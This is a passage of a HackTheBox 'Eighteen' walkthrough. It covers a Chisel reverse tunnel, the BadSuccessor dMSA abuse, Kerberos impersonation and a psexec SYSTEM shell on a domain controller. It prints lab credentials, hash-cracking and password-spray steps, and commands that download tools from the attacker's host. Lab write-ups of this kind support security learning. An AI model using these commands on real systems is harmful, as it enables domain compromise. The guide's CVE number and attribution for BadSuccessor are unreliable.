2025/12/04 14:50:24 server: Reverse tunnelling enabled
2025/12/04 14:50:24 server: Fingerprint abc123...
2025/12/04 14:50:24 server: Listening on http://0.0.0.0:8000
```

**Leave this running!** It needs to stay active for the tunnel to work.

### Step 25: Setup Chisel Client (Target)

Switch back to your Evil-WinRM session.

**Upload chisel.exe to the target:**
```powershell
IWR -Uri http://10.10.14.56:8000/chisel.exe -OutFile C:\Users\adam.scott\chisel.exe
```

**Important:** Make sure your Python HTTP server (from Step 20) is still running. If not, restart it in another terminal.

**Verify the download:**
```powershell
dir chisel.exe
```

**Start the Chisel client:**
```powershell
.\chisel.exe client 10.10.14.56:8000 R:88:127.0.0.1:88 R:389:127.0.0.1:389 R:445:127.0.0.1:445 R:135:127.0.0.1:135
```

**Parameter Breakdown:**
- `.\chisel.exe client` - Run in client mode
- `10.10.14.56:8000` - Connect to Chisel server (CHANGE TO YOUR IP!)
- `R:88:127.0.0.1:88` - Reverse forward: Kali's 127.0.0.1:88 → Target's 127.0.0.1:88 (Kerberos)
- `R:389:127.0.0.1:389` - Reverse forward port 389 (LDAP)
- `R:445:127.0.0.1:445` - Reverse forward port 445 (SMB)
- `R:135:127.0.0.1:135` - Reverse forward port 135 (RPC)

**What happens:**
In your Chisel server terminal (on Kali), you'll see:
```
2025/12/04 14:50:30 server: session#1: tun: proxy#R:88=>127.0.0.1:88: Listening
2025/12/04 14:50:30 server: session#1: tun: proxy#R:389=>127.0.0.1:389: Listening
2025/12/04 14:50:30 server: session#1: tun: proxy#R:445=>127.0.0.1:445: Listening
2025/12/04 14:50:30 server: session#1: tun: proxy#R:135=>127.0.0.1:135: Listening
```

**Success!** The tunnel is established. Ports are now forwarded.

**Note:** This Evil-WinRM window will hang because chisel is running. That's normal - **open a NEW terminal** for the next steps.

### Step 26: Request Kerberos Ticket with Impersonation

Open a **NEW terminal** on Kali. We'll use Impacket's `getST.py` to abuse our malicious dMSA.

**Navigate to your directory:**
```bash
cd ~/htb/eighteen
```

**Command:**
```bash
getST.py eighteen.htb/adam.scott:iloveyou1 -impersonate 'enc_dmsa$' -self -dmsa -dc-ip 127.0.0.1
```

**Parameter Breakdown:**
- `getST.py` - Impacket's "Get Service Ticket" tool
- `eighteen.htb/adam.scott:iloveyou1` - Our valid domain credentials
- `-impersonate 'enc_dmsa$'` - The malicious dMSA we created (note the $ at the end - computer accounts end with $)
- `-self` - Request a ticket for the account itself (S4U2Self delegation)
- `-dmsa` - Specify this is a delegated managed service account
- `-dc-ip 127.0.0.1` - Connect to the DC via our Chisel tunnel

**What this does:**
1. Authenticates as adam.scott
2. Requests a Service Ticket for enc_dmsa$ to access itself
3. Because enc_dmsa$ is configured to impersonate Administrator, the ticket contains Administrator's PAC (Privilege Attribute Certificate)
4. The ticket is saved to a file for later use

**Expected Output:**
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for user
[*] Impersonating enc_dmsa$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in enc_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

**Success!** You now have a Kerberos ticket file.

**Verify the ticket file exists:**
```bash
ls -la *.ccache
```

You should see: `enc_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache`

### Step 27: Export Kerberos Ticket

Linux (and Impacket tools) use an environment variable to know which Kerberos ticket to use.

**Command:**
```bash
export KRB5CCNAME=enc_dmsa\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

**Explanation:**
- `export` - Creates an environment variable
- `KRB5CCNAME` - The variable name that Kerberos libraries look for
- `enc_dmsa\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache` - Path to our ticket file

**Important:** The backslash (`\`) before the `$` is necessary to escape it in bash. Otherwise, bash thinks `$@krbtgt_EIGHTEEN` is a variable.

**Verify it's set:**
```bash
echo $KRB5CCNAME
```

Should output: `enc_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache`

### Step 28: Verify Ticket Works

Before going for the final attack, let's test that our Kerberos ticket works.

**Command:**
```bash
smbclient.py -k -no-pass -target-ip 127.0.0.1 DC01.eighteen.htb
```

**Parameter Breakdown:**
- `smbclient.py` - Impacket's SMB client
- `-k` - Use Kerberos authentication (uses the ticket from KRB5CCNAME)
- `-no-pass` - Don't prompt for password
- `-target-ip 127.0.0.1` - Connect via the Chisel tunnel
- `DC01.eighteen.htb` - Target hostname (important for Kerberos)

**What to expect:**
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# 
```

The `#` prompt means you're connected to SMB!

**Test commands:**
```
shares
```

You should see all shares including admin shares like `C$`, `ADMIN$`, etc.

**Exit smbclient:**
```
exit
```

**Success!** The Kerberos ticket is valid and we have high privileges.

### Step 29: Get Administrator Shell

Now for the finale - let's get a shell as SYSTEM/Administrator.

**Command:**
```bash
psexec.py -k -no-pass -target-ip 127.0.0.1 DC01.eighteen.htb
```

**Parameter Breakdown:**
- `psexec.py` - Impacket's remote command execution tool
- `-k` - Use Kerberos authentication
- `-no-pass` - Don't prompt for password
- `-target-ip 127.0.0.1` - Connect via Chisel tunnel
- `DC01.eighteen.htb` - Target hostname

**What psexec.py does:**
1. Connects to the target using SMB
2. Uploads a service binary to `C:\Windows\`
3. Creates a Windows service
4. Starts the service, which runs as SYSTEM
5. Provides you with a command shell

**Expected Output:**
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file WusgFRhO.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service iNKD on 127.0.0.1.....
[*] Starting service iNKD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.26100.2314]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

**You now have a SYSTEM shell on the Domain Controller!**

**Verify your privileges:**
```cmd
whoami
```

**Output:**
```
nt authority\system
```

**SYSTEM is the highest privilege level on Windows - even higher than Administrator!**

### Step 30: Read Root Flag

**Command:**
```cmd
type C:\Users\Administrator\Desktop\root.txt
```

**Expected Output:**
```
a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

**🎉🎉🎉 ROOT FLAG OBTAINED! 🎉🎉🎉**

Copy this flag and submit it on HackTheBox to mark the machine as PWNED!

**Optional - Explore:**
```cmd
dir C:\Users\Administrator\Desktop
dir C:\Users\
net user /domain
net group "Domain Admins" /domain
```

You now have complete control over the Domain Controller!

**Clean Up:**
When you're done, you can:
1. Exit psexec: `exit`
2. Stop Chisel client: Ctrl+C in the Evil-WinRM window
3. Stop Chisel server: Ctrl+C in the Chisel server terminal
4. Exit Evil-WinRM: `exit`

---

## Summary

### Attack Chain Overview

```
1. SQL Server Access (kevin:iNa2we6haRj2gaw!)
   ↓
2. User Impersonation (kevin → appdev)
   ↓
3. Database Enumeration (financial_planner database)
   ↓
4. Extract Admin Hash (pbkdf2:sha256)
   ↓
5. Crack Password Hash (admin:iloveyou1)
   ↓
6. User Enumeration (found multiple domain users)
   ↓
7. Password Reuse (adam.scott:iloveyou1)
   ↓
8. WinRM Access (Evil-WinRM as adam.scott)
   ↓
9. BadSuccessor Exploit (create malicious dMSA)
   ↓
10. Port Forwarding (Chisel tunneling)
   ↓
11. Kerberos Ticket Request (getST.py with impersonation)
   ↓
12. Administrator Access (psexec with Kerberos ticket)
   ↓
13. ROOT FLAG! 🚩
```

### Key Commands Reference

**Reconnaissance:**
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
gobuster dir -u http://eighteen.htb -w /usr/share/wordlists/dirb/common.txt
```

**SQL Server:**
```bash
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@<TARGET_IP>
```

**Hash Cracking:**
```bash
hashcat -m 10900 hash_hashcat.txt /usr/share/wordlists/rockyou.txt
```

**WinRM Access:**
```bash
evil-winrm -i <TARGET_IP> -u adam.scott -p 'iloveyou1'
```

**SharpSuccessor:**
```powershell
.\SharpSuccessor.exe escalate -targetOU "OU=staff,DC=eighteen,DC=htb" -dmsa enc_dmsa -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname enc_dmsa -user adam.scott -dc-ip DC01.eighteen.htb
```

**Chisel Tunneling:**
```bash
# Kali (Server):
./chisel server -p 8000 --reverse

# Target (Client):
.\chisel.exe client 10.10.14.56:8000 R:88:127.0.0.1:88 R:389:127.0.0.1:389 R:445:127.0.0.1:445 R:135:127.0.0.1:135
```

**Kerberos Exploitation:**
```bash
getST.py eighteen.htb/adam.scott:iloveyou1 -impersonate 'enc_dmsa$' -self -dmsa -dc-ip 127.0.0.1
export KRB5CCNAME=enc_dmsa\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
psexec.py -k -no-pass -target-ip 127.0.0.1 DC01.eighteen.htb
```

### Credentials Found

```
SQL Server:     kevin:iNa2we6haRj2gaw!
Web Admin:      admin:iloveyou1
Domain User:    adam.scott:iloveyou1
```

### Tools Used

- **Nmap**: Port scanning
- **Gobuster**: Directory enumeration
- **Impacket Suite**:
  - `mssqlclient`: SQL Server access
  - `getST.py`: Kerberos ticket requests
  - `psexec.py`: Remote command execution
- **Hashcat**: Password hash cracking
- **Evil-WinRM**: Windows Remote Management
- **Chisel**: Port forwarding/tunneling
- **SharpSuccessor**: BadSuccessor exploit tool

### Learning Objectives Achieved

✅ SQL Server enumeration and user impersonation  
✅ PBKDF2-SHA256 hash identification and cracking  
✅ Password reuse attack methodology  
✅ Active Directory delegation abuse  
✅ Kerberos ticket manipulation  
✅ Port forwarding for exploitation  
✅ Domain Controller compromise  

### Additional Resources

- [BadSuccessor Vulnerability Details](https://www.netspi.com/blog/technical-blog/network-penetration-testing/badsuccessor-cve-2024-49138/)
- [Impacket Documentation](https://github.com/fortra/impacket)
- [Evil-WinRM Usage](https://github.com/Hackplayers/evil-winrm)
- [Chisel Tunneling Guide](https://github.com/jpillora/chisel)
- [PBKDF2 Hash Cracking](https://hashcat.net/wiki/doku.php?id=example_hashes)

---

## Troubleshooting Common Issues

### Issue 1: Cannot Connect to SQL Server

**Error Message:**
```
[-] ERROR(DC01): Line 1: Login failed for user 'kevin'.
```

**Possible Causes:**
- Wrong IP address
- Port 1433 is filtered by firewall
- Incorrect credentials

**Solutions:**

1. **Verify the target IP is correct:**
   ```bash
   ping eighteen.htb
   ```

2. **Check if port 1433 is open:**
   ```bash
   nmap -p 1433 10.129.109.187
   ```

3. **Try with explicit encryption flag:**
   ```bash
   impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.109.187 -windows-auth
   ```

### Issue 2: Hashcat Not Recognizing Hash Format

**Error Message:**
```
Token length exception
No hashes loaded
```

**Cause:**
The hash format is incorrect for Hashcat.

**Solution:**

1. **Verify the hash file format:**
   ```bash
   cat hash_hashcat.txt
   ```
   
   Should look exactly like:
   ```
   sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
   ```

2. **Check for hidden characters:**
   ```bash
   cat -A hash_hashcat.txt
   ```
   
   Should NOT see `$` or other special characters at the end.

3. **Recreate the hash file carefully:**
   ```bash
   echo 'sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=' > hash_hashcat.txt
   ```

4. **Test with a single hash:**
   ```bash
   hashcat -m 10900 hash_hashcat.txt --show
   ```

### Issue 3: Hashcat is Very Slow

**Symptom:**
Hashcat is running but estimating hours or days to complete.

**Why This Happens:**
PBKDF2 with 600,000 iterations is computationally expensive. If you're running in a VM with limited CPU resources, it will be slow.

**Solutions:**

1. **Use a GPU if available:**
   ```bash
   hashcat -m 10900 hash_hashcat.txt /usr/share/wordlists/rockyou.txt -O
   ```
   The `-O` flag optimizes for GPU.

2. **Use a smaller wordlist first:**
   ```bash
   hashcat -m 10900 hash_hashcat.txt /usr/share/wordlists/fasttrack.txt
   ```

3. **Check if password is in rockyou.txt:**
   ```bash
   grep "iloveyou1" /usr/share/wordlists/rockyou.txt
   ```
   
   If it's there, just wait - it will crack eventually.

4. **Use John the Ripper as alternative:**
   ```bash
   # Convert hash to John format first
   echo 'admin:pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' > admin_john.txt
   john --format=django admin_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
   ```

### Issue 4: Evil-WinRM Connection Fails

**Error Messages:**
```
Error: An error of type WinRM::WinRMAuthorizationError happened
Error: Digest authentication is not supported
```

**Possible Causes:**
- Wrong credentials
- WinRM not enabled for this user
- Port 5985 blocked

**Solutions:**

1. **Verify credentials are correct:**
   ```bash
   netexec winrm 10.129.109.187 -u adam.scott -p 'iloveyou1'
   ```
   
   Should say `(Pwn3d!)`

2. **Try HTTPS/SSL connection:**
   ```bash
   evil-winrm -i 10.129.109.187 -u adam.scott -p 'iloveyou1' -S -P 5986
   ```

3. **Check if port 5985 is open:**
   ```bash
   nmap -p 5985 10.129.109.187
   ```

4. **Try with domain prefix:**
   ```bash
   evil-winrm -i 10.129.109.187 -u 'eighteen.htb\adam.scott' -p 'iloveyou1'
   ```

### Issue 5: SharpSuccessor Fails to Create dMSA

**Error Messages:**
```
[!] Error: Access denied when creating computer account
[!] Error: Insufficient rights to modify OU
```

**Cause:**
You don't have the necessary permissions, or the OU path is wrong.

**Solutions:**

1. **Verify you're in the IT group:**
   ```powershell
   net user adam.scott /domain
   ```
   
   Look for "Global Group memberships" and verify IT is listed.

2. **Try different OU paths:**
   ```powershell
   # Try OU=IT
   .\SharpSuccessor.exe escalate -targetOU "OU=IT,DC=eighteen,DC=htb" -dmsa enc_dmsa -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname enc_dmsa -user adam.scott -dc-ip DC01.eighteen.htb
   
   # Try OU=Computers
   .\SharpSuccessor.exe escalate -targetOU "OU=Computers,DC=eighteen,DC=htb" -dmsa enc_dmsa -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname enc_dmsa -user adam.scott -dc-ip DC01.eighteen.htb
   ```

3. **List OUs you have access to:**
   ```powershell
   Get-ADOrganizationalUnit -Filter * | Select-Object Name,DistinguishedName
   ```

4. **Check specific permissions:**
   ```powershell
   Get-Acl "AD:\OU=staff,DC=eighteen,DC=htb" | Format-List
   ```

### Issue 6: Chisel Connection Fails

**Error Message:**
```
Could not connect to server
Connection refused
```

**Possible Causes:**
- Chisel server not running on Kali
- Wrong IP address
- Firewall blocking port 8000
- HTTP server still using port 8000

**Solutions:**

1. **Check if chisel server is running:**
   On Kali:
   ```bash
   ps aux | grep chisel
   ```

2. **Verify port 8000 is listening:**
   ```bash
   netstat -tlnp | grep 8000
   ```

3. **Stop Python HTTP server if it's conflicting:**
   ```bash
   # Find the process
   ps aux | grep "python3 -m http.server"
   # Kill it (replace PID)
   kill <PID>
   ```

4. **Use a different port for chisel:**
   On Kali:
   ```bash
   chisel server -p 9000 --reverse
   ```
   
   On Target:
   ```powershell
   .\chisel.exe client 10.10.14.56:9000 R:88:127.0.0.1:88 R:389:127.0.0.1:389 R:445:127.0.0.1:445 R:135:127.0.0.1:135
   ```

5. **Check Kali's IP address:**
   ```bash
   ip addr show tun0
   ```
   
   Make sure you're using the correct VPN IP!

### Issue 7: getST.py Clock Skew Error

**Error Message:**
```
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

**Cause:**
Your Kali machine's time differs too much from the Domain Controller's time. Kerberos requires time synchronization within 5 minutes.

**Solutions:**

1. **Check current time difference:**
   ```bash
   # Your time
   date
   
   # DC time (from HTTP headers)
   curl -I http://eighteen.htb | grep Date
   ```

2. **Sync time with NTP:**
   ```bash
   sudo ntpdate -u pool.ntp.org
   ```

3. **Manually set time:**
   ```bash
   # If you know the DC time is correct
   sudo date -s "2025-12-04 14:50:00"
   ```

4. **Use rdate with DC:**
   ```bash
   sudo rdate -n eighteen.htb
   ```

### Issue 8: getST.py Cannot Find enc_dmsa$

**Error Message:**
```
[-] Principal not found in database
[-] User enc_dmsa$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**Possible Causes:**
- SharpSuccessor didn't actually create the account
- Account was created in wrong OU
- Wrong account name

**Solutions:**

1. **Verify the account exists (from Evil-WinRM):**
   ```powershell
   Get-ADComputer -Identity "enc_dmsa"
   ```

2. **Check the exact account name:**
   ```powershell
   Get-ADComputer -Filter "Name -like 'enc*'" | Select-Object Name
   ```

3. **List all computer accounts you created:**
   ```powershell
   Get-ADComputer -Filter * -Property Created | Where-Object {$_.Created -gt (Get-Date).AddHours(-1)} | Select-Object Name,Created
   ```

4. **If needed, recreate with different name:**
   ```powershell
   .\SharpSuccessor.exe escalate -targetOU "OU=staff,DC=eighteen,DC=htb" -dmsa myaccount -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname myaccount -user adam.scott -dc-ip DC01.eighteen.htb
   ```
   
   Then in getST.py, use `-impersonate 'myaccount$'`

### Issue 9: psexec.py Hangs or Fails

**Error Message:**
```
[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED
```

**Possible Causes:**
- Kerberos ticket expired
- Ticket not properly exported
- Chisel tunnel dropped
- Wrong hostname

**Solutions:**

1. **Verify Kerberos ticket is set:**
   ```bash
   echo $KRB5CCNAME
   ```
   
   Should show the .ccache file path.

2. **Check ticket is valid:**
   ```bash
   klist
   ```
   
   Should show ticket details (requires `krb5-user` package).

3. **Verify chisel is still running:**
   Check both Kali and Windows terminals - both should show active connections.

4. **Re-export the ticket:**
   ```bash
   export KRB5CCNAME=$(pwd)/enc_dmsa\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
   ```

5. **Try alternative execution methods:**
   
   **Option A - smbexec.py:**
   ```bash
   smbexec.py -k -no-pass -target-ip 127.0.0.1 DC01.eighteen.htb
   ```
   
   **Option B - wmiexec.py:**
   ```bash
   wmiexec.py -k -no-pass -target-ip 127.0.0.1 DC01.eighteen.htb
   ```
   
   **Option C - atexec.py:**
   ```bash
   atexec.py -k -no-pass -target-ip 127.0.0.1 DC01.eighteen.htb 'whoami'
   ```

6. **Use explicit hostname resolution:**
   Add to /etc/hosts:
   ```bash
   echo "127.0.0.1 DC01.eighteen.htb DC01" | sudo tee -a /etc/hosts
   ```

### Issue 10: Cannot Read root.txt

**Error Message:**
```
Access is denied
```

**Cause:**
You don't actually have SYSTEM/Administrator privileges.

**Solutions:**

1. **Verify your privilege level:**
   ```cmd
   whoami
   ```
   
   Should say `nt authority\system` or `eighteen\administrator`

2. **Check if you can list the file:**
   ```cmd
   dir C:\Users\Administrator\Desktop\
   ```

3. **Try alternative methods to read:**
   ```cmd
   type C:\Users\Administrator\Desktop\root.txt
   
   more C:\Users\Administrator\Desktop\root.txt
   
   powershell Get-Content C:\Users\Administrator\Desktop\root.txt
   ```

4. **Download the file:**
   ```cmd
   copy C:\Users\Administrator\Desktop\root.txt C:\Users\Public\root.txt
   ```
   
   Then from Evil-WinRM (different session):
   ```powershell
   download C:\Users\Public\root.txt
   ```

---

## Summary

### Complete Attack Chain

Here's the entire attack path from start to finish:

```
┌─────────────────────────────────────────────────────────────┐
│                    RECONNAISSANCE PHASE                     │
├─────────────────────────────────────────────────────────────┤
│ 1. Nmap scan discovers:                                     │
│    - Port 80 (HTTP)                                         │
│    - Port 1433 (MSSQL)                                      │
│    - Port 5985 (WinRM)                                      │
│ 2. Web enumeration finds Flask budgeting application        │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│                   DATABASE ACCESS PHASE                     │
├─────────────────────────────────────────────────────────────┤
│ 3. Connect to MSSQL with kevin:iNa2we6haRj2gaw!            │
│ 4. Impersonate appdev user (SQL Server impersonation)      │
│ 5. Access financial_planner database                        │
│ 6. Dump users table → Extract admin password hash          │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│                 PASSWORD CRACKING PHASE                     │
├─────────────────────────────────────────────────────────────┤
│ 7. Identify hash type: PBKDF2-HMAC-SHA256                  │
│ 8. Convert hash to Hashcat format (base64 encoding)        │
│ 9. Crack with Hashcat mode 10900                           │
│    Result: admin:iloveyou1                                  │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│                LATERAL MOVEMENT PHASE                       │
├─────────────────────────────────────────────────────────────┤
│ 10. Enumerate domain users from database                   │
│ 11. Password spray iloveyou1 against WinRM                 │
│     Success: adam.scott:iloveyou1                          │
│ 12. Connect via Evil-WinRM → USER FLAG OBTAINED            │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│              PRIVILEGE ESCALATION PHASE                     │
├─────────────────────────────────────────────────────────────┤
│ 13. Discover adam.scott is in IT group                     │
│ 14. Upload SharpSuccessor.exe to target                    │
│ 15. Execute BadSuccessor exploit:                           │
│     - Create malicious dMSA (enc_dmsa$)                    │
│     - Configure to impersonate Administrator                │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│                  TICKET MANIPULATION PHASE                  │
├─────────────────────────────────────────────────────────────┤
│ 16. Setup Chisel tunnel (forward Kerberos/SMB/LDAP)       │
│ 17. Request Service Ticket with getST.py                   │
│     - Impersonate enc_dmsa$ (which impersonates Admin)     │
│     - Obtain Kerberos ticket with Admin privileges         │
│ 18. Export KRB5CCNAME environment variable                 │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│                    DOMAIN COMPROMISE                        │
├─────────────────────────────────────────────────────────────┤
│ 19. Execute psexec.py with Kerberos ticket                 │
│ 20. Obtain SYSTEM shell on Domain Controller               │
│ 21. Read root.txt → ROOT FLAG OBTAINED                     │
│                                                             │
│              🎉 DOMAIN CONTROLLER PWNED! 🎉                │
└─────────────────────────────────────────────────────────────┘
```

### Key Commands Reference Card

**Save this for quick reference during the attack:**

```bash
# ======================
# RECONNAISSANCE
# ======================
nmap -sC -sV -oN nmap.txt <TARGET_IP>
gobuster dir -u http://eighteen.htb -w /usr/share/wordlists/dirb/common.txt

# ======================
# SQL SERVER ACCESS
# ======================
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@<TARGET_IP>

# In SQL prompt:
EXECUTE AS LOGIN = 'appdev';
USE financial_planner;
SELECT * FROM users;
exit

# ======================
# HASH CRACKING
# ======================
# Save hash to file
echo 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90...' > admin_hash.txt

# Convert for Hashcat
echo 'sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=' > hash_hashcat.txt

# Crack
hashcat -m 10900 hash_hashcat.txt /usr/share/wordlists/rockyou.txt

# ======================
# PASSWORD REUSE
# ======================
# Create user list
cat > found_users.txt << EOF
adam.scott
jane.smith
bob.brown
EOF

# Test with NetExec
netexec winrm <TARGET_IP> -u found_users.txt -p 'iloveyou1'

# ======================
# INITIAL ACCESS
# ======================
evil-winrm -i <TARGET_IP> -u adam.scott -p 'iloveyou1'

# Get user flag
type C:\Users\adam.scott\Desktop\user.txt

# ======================
# PRIVILEGE ESCALATION
# ======================
# On Kali - Start HTTP server
python3 -m http.server 8000

# On Target - Upload exploit
IWR -Uri http://<YOUR_KALI_IP>:8000/SharpSuccessor.exe -OutFile .\SharpSuccessor.exe

# Execute exploit
.\SharpSuccessor.exe escalate -targetOU "OU=staff,DC=eighteen,DC=htb" -dmsa enc_dmsa -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname enc_dmsa -user adam.scott -dc-ip DC01.eighteen.htb

# ======================
# PORT FORWARDING
# ======================
# Terminal 1 - Chisel Server (Kali)
chisel server -p 8000 --reverse

# Terminal 2 - Upload chisel to target
IWR -Uri http://<YOUR_KALI_IP>:8000/chisel.exe -OutFile .\chisel.exe

# Terminal 3 - Chisel Client (Target via Evil-WinRM)
.\chisel.exe client <YOUR_KALI_IP>:8000 R:88:127.0.0.1:88 R:389:127.0.0.1:389 R:445:127.0.0.1:445 R:135:127.0.0.1:135

# ======================
# KERBEROS EXPLOITATION
# ======================
# Terminal 4 - New Kali terminal
cd ~/htb/eighteen

# Request ticket
getST.py eighteen.htb/adam.scott:iloveyou1 -impersonate 'enc_dmsa$' -self -dmsa -dc-ip 127.0.0.1

# Export ticket
export KRB5CCNAME=enc_dmsa\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache

# Verify ticket
smbclient.py -k -no-pass -target-ip 127.0.0.1 DC01.eighteen.htb

# ======================
# DOMAIN COMPROMISE
# ======================
# Get SYSTEM shell
psexec.py -k -no-pass -target-ip 127.0.0.1 DC01.eighteen.htb

# Get root flag
type C:\Users\Administrator\Desktop\root.txt
```

### Credentials Found

| Service | Username | Password | Access Level |
|---------|----------|----------|--------------|
| MSSQL | kevin | iNa2we6haRj2gaw! | Database login, can impersonate appdev |
| Web App | admin | iloveyou1 | Web application administrator |
| Domain | adam.scott | iloveyou1 | Domain user, IT group member |
| Domain | Administrator | (via Kerberos ticket) | Domain Administrator / SYSTEM |

### Tools and Technologies Used

| Category | Tool | Purpose |
|----------|------|---------|
| **Reconnaissance** | Nmap | Port scanning and service enumeration |
| | Gobuster | Directory enumeration |
| **Exploitation** | Impacket Suite | MSSQL client, getST.py, psexec.py |
| | Hashcat | Password hash cracking |
| | Evil-WinRM | Windows Remote Management shell |
| | SharpSuccessor | BadSuccessor exploit (CVE-2024-49138) |
| | Chisel | TCP/UDP tunneling for port forwarding |
| **Analysis** | xxd | Hex manipulation |
| | base64 | Encoding conversion |

### Skills Demonstrated

✅ **Network Enumeration** - Port scanning, service identification  
✅ **Database Exploitation** - SQL Server impersonation, credential extraction  
✅ **Cryptography** - Hash identification, PBKDF2 understanding, base64 encoding  
✅ **Password Cracking** - Hashcat usage, wordlist attacks  
✅ **Password Reuse** - Credential stuffing, lateral movement  
✅ **Windows Administration** - PowerShell, WinRM, Active Directory queries  
✅ **Active Directory Attacks** - dMSA abuse, Kerberos delegation  
✅ **Ticket Manipulation** - S4U2Self/S4U2Proxy, Kerberos authentication  
✅ **Network Pivoting** - Port forwarding, tunneling with Chisel  
✅ **Privilege Escalation** - BadSuccessor vulnerability exploitation  

### Learning Resources

Want to learn more about the techniques used in this box?

**Active Directory Security:**
- [Attacking and Defending Active Directory](https://zer1t0.gitlab.io/posts/attacking_ad/)
- [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [AD Security - Kerberos Attacks](https://adsecurity.org/?page_id=1821)

**BadSuccessor (CVE-2024-49138):**
- [NetSPI Blog - BadSuccessor Deep Dive](https://www.netspi.com/blog/technical-blog/network-penetration-testing/badsuccessor-cve-2024-49138/)
- [Original Research Paper](https://www.netspi.com/research/badsuccessor)

**Kerberos Delegation:**
- [HarmJ0y - Kerberos Delegation](https://blog.harmj0y.net/activedirectory/s4u2pwnage/)
- [Elad Shamir - Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)

**Tools Documentation:**
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [Chisel Usage](https://github.com/jpillora/chisel)
- [Hashcat Wiki](https://hashcat.net/wiki/)

---

## Final Notes

### What Makes This Box Special

**Eighteen** is an excellent machine for learning:

1. **Real-World Scenario** - The attack chain mimics actual penetration testing scenarios
2. **Multiple Techniques** - Combines database attacks, password cracking, and AD exploitation
3. **Modern Vulnerability** - BadSuccessor (CVE-2024-49138) is a recent discovery from 2024
4. **Practical Skills** - Everything learned here applies to real red team engagements

### Recommended Next Steps

After completing this machine:

1. **Try Similar Boxes:**
   - Escape - Active Directory with SeImpersonatePrivilege
   - Forest - AS-REP Roasting and DCSync
   - Sauna - Kerberoasting attacks

2. **Practice the Techniques:**
   - Set up your own Active Directory lab
   - Practice Kerberos attacks in a controlled environment
   - Learn more about dMSA and delegation

3. **Expand Your Knowledge:**
   - Study for OSCP or CRTO certification
   - Read research papers on AD security
   - Join the HackTheBox Discord for discussions

### Ethical Considerations

**Important Reminder:**
- These techniques are for **educational purposes** and **authorized testing** only
- Never attack systems you don't own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- Always follow responsible disclosure when finding vulnerabilities

---

**Congratulations on completing the Eighteen machine!** 🎉🎉🎉

You've learned valuable skills in:
- Database exploitation
- Password cracking
- Active Directory attacks
- Kerberos delegation abuse
- Domain Controller compromise

These skills are fundamental for any aspiring penetration tester or red team operator.

**Keep practicing, keep learning, and happy hacking!**

---

*HackTheBox - Eighteen Machine Walkthrough*  
*December 2025*  
*For educational purposes only*
